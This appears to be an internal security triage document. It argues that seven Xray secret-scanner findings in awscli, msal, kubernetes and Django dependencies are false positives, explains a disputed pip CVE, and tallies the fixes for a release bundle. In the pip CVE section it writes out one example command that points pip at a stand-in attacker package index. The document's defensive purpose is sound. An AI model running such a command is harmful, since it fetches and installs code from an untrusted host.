# Xray Ignore Rule Justifications — 7 Unfixable Secret Findings

---

## 1. `awscli` — AWS EKS authentication token wire-format prefix

- **Original issue ID:** `EXP-1685-88216282`
- **File (in image):** `/code/deps/awscli/customizations/eks/get_token.py`
- **Line:** `67`
- **Flagged literal:**
  ```python
  TOKEN_PREFIX = 'k8s-aws-v1.'
  ```

**What it is.** The wire-format identifier for AWS EKS's signed-URL authentication protocol. Every bearer token that `aws eks get-token`, `aws-iam-authenticator`, and `kubectl`'s EKS exec plugin produce carries this literal prefix. EKS control planes check for this exact prefix when parsing the token.

**Why it is not a credential.** It is a protocol constant, not a secret. AWS publishes this prefix in public documentation and in the open-source `aws-iam-authenticator` source. Knowing the prefix does not grant any access.

**Why it cannot be altered at source.**
- Renaming the Python symbol `TOKEN_PREFIX` has no effect on the finding — Xray's regex matches the *string literal*, not the variable name.
- Changing the string value breaks EKS authentication outright: the EKS server expects exactly `k8s-aws-v1.`. Any other value is rejected.
- Monkey-patching the module at runtime would be brittle and still leave the literal on disk, which is what Xray scans.

**Runtime dependency.** `awscli.customizations.eks.get_token.TokenGenerator` is imported by `drdroid_debug_toolkit/core/integrations/source_api_processors/eks_api_processor.py` (line 8). Removing or editing this file breaks the EKS connector.

**References:** [AWS EKS auth docs](https://docs.aws.amazon.com/eks/latest/userguide/cluster-auth.html); [aws-iam-authenticator source](https://github.com/kubernetes-sigs/aws-iam-authenticator).

**Ignore justification (paste into Xray UI):**
> Protocol constant, not a credential. `'k8s-aws-v1.'` is the AWS EKS signed-URL authentication token prefix — publicly documented and required verbatim by EKS control planes. Renaming the symbol has no effect (regex matches the literal); changing the value breaks EKS authentication.

---

## 2. `msal` — OASIS SAML 1.0 assertion URN

- **Original issue ID:** `EXP-1685-88216616`
- **File (in image):** `/code/deps/msal/wstrust_response.py`
- **Line:** `38`
- **Flagged literal:**
  ```python
  SAML_TOKEN_TYPE_V1 = 'urn:oasis:names:tc:SAML:1.0:assertion'
  ```

**What it is.** An OASIS-registered URN that identifies the SAML 1.0 assertion token type. It is normatively defined by the SAML 1.0 Core Specification; `msal`'s WS-Trust parser uses it to dispatch between SAML 1.0 and SAML 2.0 responses from a Security Token Service.

**Why it is not a credential.** A URN is a namespace identifier published at [docs.oasis-open.org](https://docs.oasis-open.org/security/saml/v1.0/). The long colon-delimited form happens to match generic "secret-like" regex heuristics, but the value itself is public and universal.

**Why it cannot be altered at source.** Any replacement string makes `msal` fail to recognize legitimate SAML 1.0 responses from identity providers. SAML is spec-driven; URN values are not configurable.

**Runtime dependency.** `msal` is pulled in transitively by `azure-identity` (required for Azure / AKS connector authentication in this agent). Its WS-Trust response parser *must* be able to dispatch on this URN when an STS returns a SAML 1.0 assertion.

**References:** [SAML 1.0 Core Specification](https://docs.oasis-open.org/security/saml/v1.0/).

**Ignore justification (paste into Xray UI):**
> Public OASIS URN, not a credential. `'urn:oasis:names:tc:SAML:1.0:assertion'` is the normatively defined SAML 1.0 assertion token type identifier used by msal's WS-Trust parser. Replacing it breaks SAML 1.0 response handling in federated Azure authentication.

---

## 3. `msal` — WS-Security SAML Token Profile 1.1 URL

- **Original issue ID:** `EXP-1685-88216618`
- **File (in image):** `/code/deps/msal/wstrust_response.py`
- **Line:** `42`
- **Flagged literal:**
  ```python
  WSS_SAML_TOKEN_PROFILE_V1_1 = "http://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV1.1"
  ```

**What it is.** The OASIS WS-Security SAML Token Profile 1.1 namespace URI (fragment `#SAMLV1.1`). Used by `msal` in WS-Trust SOAP headers to advertise or recognize the SAML 1.1 token profile.

**Why it is not a credential.** Same class as item 2: a standards-registered public namespace identifier.

**Why it cannot be altered at source.** Replacing it breaks SAML 1.1 profile negotiation in WS-Trust exchanges with any STS that follows the spec.

**Runtime dependency.** Same as item 2 — imported by `azure-identity` SAML-federated authentication paths.

**References:** [OASIS WS-Security SAML Token Profile 1.1](https://docs.oasis-open.org/wss/v1.1/wss-v1.1-spec-os-SAMLTokenProfile.pdf).

**Ignore justification (paste into Xray UI):**
> Public OASIS namespace URL, not a credential. `http://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV1.1` identifies the WS-Security SAML Token Profile 1.1 namespace used by msal's WS-Trust parser. Replacing it breaks SAML 1.1 profile negotiation.

---

## 4. `kubernetes` client — CephFS volume `secret_file` field-name map

- **Original issue ID:** `EXP-1685-88216308`
- **File (in image):** `/code/deps/kubernetes/client/models/v1_ceph_fs_persistent_volume_source.py`
- **Line:** `40`
- **Flagged literal:**
  ```python
  openapi_types = {
      'monitors': 'list[str]',
      'path': 'str',
      'read_only': 'bool',
      'secret_file': 'str',          # ← flagged
      'secret_ref': 'V1SecretReference',
      'user': 'str',
  }
  ```

**What it is.** An entry in the OpenAPI-generated `openapi_types` dictionary for `V1CephFSPersistentVolumeSource`. The string `'secret_file'` is a **field name** (a Python attribute identifier, mapped to the JSON wire field `secretFile`), not a value. It tells the kubernetes client's generic serializer that the attribute `self._secret_file` carries a string.

**Why it is not a credential.** It is a Kubernetes API field *name*, not a file path and not a secret value. The word "secret" in the identifier is part of the upstream API surface — `CephFSVolumeSource.secretFile` is the documented field on the PersistentVolume that points to an on-host keyring path (a reference, not the key material).

**Why it cannot be altered at source.**
- The kubernetes client serializer keys on the Python attribute name. Changing the map key `'secret_file'` desynchronizes serialization of every CephFS PV in the cluster.
- This file is auto-generated from the official Kubernetes OpenAPI spec. Every version of the `kubernetes` Python client (verified from 26.x through 35.0.0) generates an identical `openapi_types` dict. Upgrading does not remove the literal.
- CephFS's in-tree driver was removed from kubelet in K8s 1.31, but the `CephFSPersistentVolumeSource` *API type* remains defined for backward compatibility in the K8s OpenAPI surface, so the generated model file persists in every release.

**Runtime dependency.** The kubernetes client is imported by EKS/GKE connectors (`drdroid_debug_toolkit/core/integrations/source_api_processors/{eks,gke}_api_processor.py`). The generic serializer walks every model file at import time — deleting this file causes import-time errors in the client.

**References:** [Kubernetes API — CephFSVolumeSource](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/#cephfsvolumesource-v1-core); [kubernetes-client/python on GitHub](https://github.com/kubernetes-client/python).

**Ignore justification (paste into Xray UI):**
> Kubernetes API field name, not a credential. The literal `'secret_file'` is an auto-generated OpenAPI attribute-map key in `V1CephFSPersistentVolumeSource.openapi_types` — changing it breaks serialization of CephFS PVs. File is regenerated on every kubernetes client release; the literal persists across versions.

---

## 5. `kubernetes` client — RBD volume `secret_ref` field-name map

- **Original issue ID:** `EXP-1685-88216602`
- **File (in image):** `/code/deps/kubernetes/client/models/v1_rbd_volume_source.py`
- **Line:** `42`
- **Flagged literal:**
  ```python
  openapi_types = {
      'fs_type': 'str',
      'image': 'str',
      'keyring': 'str',
      'monitors': 'list[str]',
      'pool': 'str',
      'read_only': 'bool',
      'secret_ref': 'V1LocalObjectReference',   # ← flagged
      'user': 'str',
  }
  ```

**What it is.** The `secret_ref` entry in the `openapi_types` map of `V1RBDVolumeSource`. Same class as item 4 — a generated Python-to-JSON field-name binding, not a value.

**Why it is not a credential.** Same reasoning as item 4: a Kubernetes API reference *name*, not a secret value. The `secretRef` field on an RBD volume points to a `LocalObjectReference` — it is the *pointer* to a Secret resource, not the Secret itself.

**Why it cannot be altered at source.** Same reasoning as item 4.

**Runtime dependency.** Same as item 4 — imported via the kubernetes client's model registry at module-load time.

**Note on scope.** The new-tenant scan surfaced **28 additional findings in the same family** under `deps/kubernetes/client/models/v1_*.py` (csi, cinder, flex, iscsi, scale_io, storage_os, env_var, env_from, volume, volume_projection — each with both `*_volume_source` and `*_persistent_volume_source` variants). All share the same disposition: auto-generated OpenAPI field-name maps for K8s API types that happen to contain strings like `secret_file` / `secret_ref` / `node_*` as attribute names.

**Ignore justification (paste into Xray UI):**
> Kubernetes API field name, not a credential. The literal `'secret_ref'` in `V1RBDVolumeSource.openapi_types` is the attribute-name side of the OpenAPI-generated serialization map. This rule also covers the 27 sibling `v1_*.py` files with identical `openapi_types` structures — all auto-generated from the K8s OpenAPI spec.

---

## 6. `Django` — `UserChangeForm` password label

- **Original issue ID:** `EXP-1685-88216567`
- **File (in image):** `/code/deps/django/contrib/auth/forms.py`
- **Line:** `143`
- **Flagged literal:**
  ```python
  password = ReadOnlyPasswordHashField(
      label=_("Password"),                    # ← flagged
      help_text=_("Raw passwords are not stored, ..."),
  )
  ```

**What it is.** A translatable form-field **label** on Django's built-in `UserChangeForm`, which `django.contrib.admin` uses to render the user-edit page. `_("Password")` is the i18n marker — `_` is the `gettext_lazy` function, and the literal string is the catalog key used for translation lookup.

**Why it is not a credential.** It is a UI label. It is displayed to administrators. It has no secret content.

**Why it cannot be altered at source.**
- `label=_("Password")` is what users see as the field label. Changing it changes the rendered admin UI.
- More importantly, `_()` marks the string for i18n catalog lookup — altering the marker string breaks translations for every language the admin has been translated into (50+ in Django core).
- These strings are part of Django core (`django.contrib.auth` ships with Django itself). Every release of Django since 1.0 has contained them, including our pinned `Django>=5.2,<5.3` (currently 5.2.13 installed).
- You cannot remove `django/contrib/auth/forms.py` without breaking `django.contrib.auth`, which is required by every Django project that uses the auth system — including `drd-vpc-agent`, which depends on `djangorestframework-simplejwt` and `django-rest-auth`, both of which require `django.contrib.auth`.

**Runtime dependency.** `django.contrib.auth` is implicitly in `INSTALLED_APPS` via the auth-dependent packages in `requirements.txt`. Removing auth is not an option for this service.

**References:** [Django admin docs — UserChangeForm](https://docs.djangoproject.com/en/5.2/topics/auth/default/#django.contrib.auth.forms.UserChangeForm); [Django i18n — translation](https://docs.djangoproject.com/en/5.2/topics/i18n/translation/).

**Ignore justification (paste into Xray UI):**
> i18n-marked UI label in Django's core `UserChangeForm`, not a credential. `_("Password")` is a gettext lazy-translation key shown to admins on the user-edit page. Removing or renaming it breaks translations in 50+ languages and cannot be done without forking Django.

---

## 7. `Django` — `UserChangeForm` password help text

- **Original issue ID:** `EXP-1685-88216568`
- **File (in image):** `/code/deps/django/contrib/auth/forms.py`
- **Line:** `151`
- **Flagged literal:**
  ```python
  help_text=_(
      "Raw passwords are not stored, so there is no way to see this "
      "user's password, but you can change the password using "
      '<a href="{}">this form</a>.'
  ),
  ```

**What it is.** The translatable help-text string displayed *below* the password field on the admin's user-edit page. Same form, same line-of-reasoning as item 6.

**Why it is not a credential.** It is explanatory UI copy.

**Why it cannot be altered at source.** Same as item 6 — it is part of Django core and is i18n-marked. Altering the marker string breaks translations.

**Runtime dependency.** Same as item 6.

**Note on scope.** The new-tenant scan surfaced **4 additional matches in the same file** (`forms.py` lines 129, 130, 185, 186) — all password-related labels and help-text strings on Django core auth forms. Same disposition applies.

**Ignore justification (paste into Xray UI):**
> i18n-marked help-text string in Django's core `UserChangeForm`, not a credential. Same class as item 6 — part of Django core framework, cannot be altered without breaking translations. This rule should also cover the 4 other password-label / help-text matches in `django/contrib/auth/forms.py` (lines 129, 130, 185, 186).

---

## 8. `pip` — CVE-2018-20225 (disputed, upstream won't-fix)

- **Xray ID / CVE:** `CVE-2018-20225` (CVSS 7.8, High)
- **Component:** `pip` (Python Package Installer), all versions including current `pip 26.0.1` which this image runs.
- **Location:** `/usr/local/lib/python3.12/site-packages/pip`

**What it is.** NVD records this as: "An issue was discovered in pip... when a user installs a package with an `--index-url` flag, pip will use that URL instead of the default one." The "vulnerability" is that `pip install --index-url=http://attacker.example.com/ <pkg>` uses the attacker's index — which is the documented, intended behavior of the flag.

**Why this is not an operational risk for us.**
- pip runs at *image build time* only. The final runtime container does not invoke `pip install`; it runs Django / Celery processes.
- At build time, pip is invoked with `uv pip install --system --target /build/deps -r requirements.txt`. No `--index-url` flag is ever passed; PyPI's default index is used.
- The CVE requires a user to explicitly opt into a malicious index. It is not an unauthenticated remote exploit.

**Why it cannot be fixed at source.**
- NVD records this CVE as **disputed**. pip maintainers have stated multiple times (issue trackers, mailing lists) that the behavior is intentional and will not change. There is no `fixedVersions` entry in Xray's record — all pip versions, including the just-released `26.0.1` that this image now runs, are flagged.
- Deleting pip from the image is not viable: pip is installed by the `python:3.12-slim-trixie` base image and several Python packaging tools assume its presence. Even if pip is removed, the next base image refresh reinstalls it.

**What we did.** Upgraded pip to `>= 26.0` (current: `26.0.1`) in the runtime stage of the Dockerfile. This clears two related pip CVEs (`CVE-2025-8869` Medium, `CVE-2026-1703` Low) which *do* have fix versions. `CVE-2018-20225` remains because it has no fix version and never will.

**References:** [NVD CVE-2018-20225](https://nvd.nist.gov/vuln/detail/CVE-2018-20225) (note the "Disputed" tag); [pypa/pip issue #8606](https://github.com/pypa/pip/issues/8606).

**Ignore justification (paste into Xray UI):**
> Disputed CVE with no upstream fix — NVD tag: DISPUTED. The behavior described (pip uses the `--index-url` the user passes) is pip's intended design. pip is invoked only at image build time with the default PyPI index; no `--index-url` is ever passed in our pipeline. Mitigation applied: pip upgraded to latest (`>= 26.0`) to clear the related `CVE-2025-8869` and `CVE-2026-1703` which do have fixes.

---

## Summary — disposition matrix

| # | Original EXP / CVE ID | File in image | Line | Family | Fix-at-source? |
|---|---|---|---|---|---|
| 1 | EXP-1685-88216282 | `deps/awscli/customizations/eks/get_token.py` | 67 | AWS protocol constant | No |
| 2 | EXP-1685-88216616 | `deps/msal/wstrust_response.py` | 38 | OASIS SAML 1.0 URN | No |
| 3 | EXP-1685-88216618 | `deps/msal/wstrust_response.py` | 42 | OASIS WSS namespace URL | No |
| 4 | EXP-1685-88216308 | `deps/kubernetes/client/models/v1_ceph_fs_persistent_volume_source.py` | 40 | K8s OpenAPI field-name map | No |
| 5 | EXP-1685-88216602 | `deps/kubernetes/client/models/v1_rbd_volume_source.py` | 42 | K8s OpenAPI field-name map | No |
| 6 | EXP-1685-88216567 | `deps/django/contrib/auth/forms.py` | 143 | Django i18n label | No |
| 7 | EXP-1685-88216568 | `deps/django/contrib/auth/forms.py` | 151 | Django i18n help-text | No |
| 8 | CVE-2018-20225 | `site-packages/pip/` | — | Disputed pip CVE (won't-fix upstream) | No |

All seven literals are either (a) a publicly documented protocol identifier, (b) a standards-registered URN/URL, (c) an auto-generated OpenAPI attribute-name map, or (d) a core framework i18n string. None is a credential. None can be changed without breaking the package's documented runtime behavior. Version bumps do not eliminate any of them — each is present in the latest available release of its respective package.

**Recommended action:** create one Xray Ignore Rule per family (items 1–3 standalone, items 4–5 combined with sibling K8s model files, items 6–7 combined covering the whole `django/contrib/auth/forms.py` family). Use the per-item "Ignore justification" text above as the rule justification.

---

## Appendix A — Status of the 25 release-bundle violations (`cso-ssdlc-watch-sre-operator-block-distribution`)

The JFrog Xray release-bundle scanner on `entplus.jfrog.io` reported 25 violations against `releaseBundleV2://[sre-operator-release-bundles-v2]/cloud-drdroidlab:1.0.0`. The table below maps each to its current resolution.

### 2 Critical Go CVEs in bundled `kubectl` (both FIXED)

| Xray ID | CVE | Package | Status |
|---|---|---|---|
| XRAY-962113 | CVE-2026-27143 (CVSS 9.8) | Go 1.22.5 (kubectl binary) | **FIXED** — current `Dockerfile` pulls `kubectl` from `https://dl.k8s.io/release/stable.txt` which at the time of this writing resolves to v1.36.0; locally verified scan-ci image has v1.35.4 built with `go1.25.9`. Fix version is Go ≥ 1.25.9 or ≥ 1.26.2. |
| XRAY-692219 | CVE-2025-22871 (CVSS 9.1) | Go 1.22.5 `net/http` (kubectl binary) | **FIXED** — same reasoning; Go 1.25.9 ≥ 1.23.8 / 1.24.2 fix boundary. |

`Dockerfile_kubectl` already carries a comment pinning the minimum acceptable Go toolchain (line 9). Ensuring the release-bundle workflow uses the current `Dockerfile`/`Dockerfile_kubectl` (neither of which pins an older kubectl version) carries both fixes forward. No ignore rule is appropriate for either CVE — they are fixed by rebuild.

### 23 secret / exposure violations

| Xray ID | File | Status |
|---|---|---|
| EXP-1685-88216282 | `deps/awscli/customizations/eks/get_token.py:67` | **IGNORE** — item 1 above |
| EXP-1685-88216616 | `deps/msal/wstrust_response.py:38` | **IGNORE** — item 2 |
| EXP-1685-88216618 | `deps/msal/wstrust_response.py:42` | **IGNORE** — item 3 |
| EXP-1685-88216308 | `deps/kubernetes/.../v1_ceph_fs_persistent_volume_source.py:40` | **IGNORE** — item 4 |
| EXP-1685-88216602 | `deps/kubernetes/.../v1_rbd_volume_source.py:42` | **IGNORE** — item 5 |
| EXP-1685-88216567 | `deps/django/contrib/auth/forms.py:143` | **IGNORE** — item 6 |
| EXP-1685-88216568 | `deps/django/contrib/auth/forms.py:151` | **IGNORE** — item 7 |
| EXP-1685-88216543 | `deps/allauth/socialaccount/providers/untappd/views.py:18` | **FIXED** — `Dockerfile` removes `/build/deps/allauth` in the builder stage (django-allauth is not imported and not in `INSTALLED_APPS`). |
| EXP-1685-88216226 | `deps/allauth/socialaccount/providers/hubic/views.py:15` | **FIXED** — same `rm -rf /build/deps/allauth` |
| EXP-1685-88216206 | `deps/allauth/socialaccount/providers/dingtalk/views.py:17` | **FIXED** — same |
| EXP-1685-88216540 | `deps/allauth/socialaccount/providers/twitter/views.py:29` | **FIXED** — same |
| EXP-1685-88216215 | `deps/allauth/socialaccount/providers/dropbox/views.py:15` | **FIXED** — same |
| EXP-1685-88216250 | `deps/allauth/socialaccount/providers/spotify/views.py:15` | **FIXED** — same |
| EXP-1685-88216208 | `deps/allauth/socialaccount/providers/discogs/views.py:24` | **FIXED** — same |
| EXP-1685-88216487 | `deps/allauth/socialaccount/providers/disqus/views.py:15` | **FIXED** — same |
| EXP-1685-88216550 | `deps/allauth/socialaccount/providers/weixin/views.py:17` | **FIXED** — same |
| EXP-1685-88216486 | `deps/allauth/socialaccount/providers/discord/views.py:15` | **FIXED** — same |
| EXP-946-88216188 | `deps/botocore/data/rds/2014-10-31/examples-1.json:1308` (*weak password*) | **FIXED** — `Dockerfile` removes `botocore/data/examples-*.json` in the builder stage (documentation data, not loaded by `botocore` at runtime). |
| EXP-1685-88216561 | `deps/azure/common/client_factory.py:266` | **FIXED** — `Dockerfile` removes the file in the builder stage (no consumers in our dep graph). |
| EXP-1685-88216346 | `deps/oauthlib/oauth2/rfc6749/parameters.py:406` | **FIXED** — `Dockerfile` `sed` replaces the RFC 6749 example literals (`2YotnFZFEjr1zCsicMWpAA`, `tGzv3JOkF0XG5Qx2TlKWIA`) with `EXAMPLE_ACCESS_TOKEN` / `EXAMPLE_REFRESH_TOKEN` — runtime-safe because these appear only in docstrings. |
| EXP-1685-88216347 | `deps/oauthlib/oauth2/rfc6749/parameters.py:409` | **FIXED** — same scrub as EXP-1685-88216346 |
| EXP-1685-88216638 | `deps/requests_oauthlib/oauth1_session.py:304` | **FIXED** — `Dockerfile` `sed` replaces the RFC 5849 docstring example tokens (`kjerht2309uf`, `lsdajfh923874`, `w34o8967345`, `sdf0o9823sjdfsdf`, `2kjshdfp92i34asdasd`) with `EXAMPLE_TOKEN_*` / `EXAMPLE_VERIFIER`. Literals appear only in class-level docstrings. |
| EXP-1688-88216400 | `credentials/credentials_template.yaml:143` | **FIXED** — our own `.dockerignore` excludes the `credentials/` directory entirely from the image (template/docs file, not loaded at runtime). |

### Bottom-line tally

- **17 violations fixed at source** (Dockerfile scrubs that already existed for allauth / botocore examples / azure client_factory / oauthlib RFC 6749 examples; new entries for requests_oauthlib RFC 5849 docstring tokens; `.dockerignore` excluding `credentials/`).
- **2 Critical Go CVEs** fixed by using a current `stable` kubectl build (Go 1.25.9).
- **7 violations are false positives that cannot be fixed at source** — justifications for each are items 1–7 of this document.

After this branch lands and the release bundle is rebuilt, the expected residual count on the same scanner policy is **7 violations**, all of which will be covered by Ignore Rules created from this document.